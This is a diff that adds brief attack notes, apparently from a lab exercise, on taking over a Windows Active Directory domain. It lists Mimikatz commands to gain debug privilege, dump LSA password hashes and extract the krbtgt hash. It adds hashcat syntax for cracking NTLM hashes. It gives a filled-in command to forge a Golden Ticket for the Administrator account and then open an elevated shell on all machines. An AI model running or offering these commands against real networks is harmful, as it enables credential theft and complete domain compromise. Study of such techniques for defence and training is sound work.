@@ -1,0 +1,22 @@
+Ensure you're running as an Administrator:
+privilege::debug
+
+Dump hashes
+lsadump::lsa /patch
+
+Crack hashes
+hashcat -m 1000 <hash> rockyou.txt
+
+Golden Ticket
+Dumps the hash and security identifier of the Kerberos Ticket Granting Ticket
+lsadump::lsa /inject /name:krbtgt
+
+Create Golden Ticket
+kerberos::golden /user: /domain: /sid: /krbtgt: /id:
+
+kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+
+This will open a new command prompt with elevated privileges to all machines
+misc::cmd
+
+
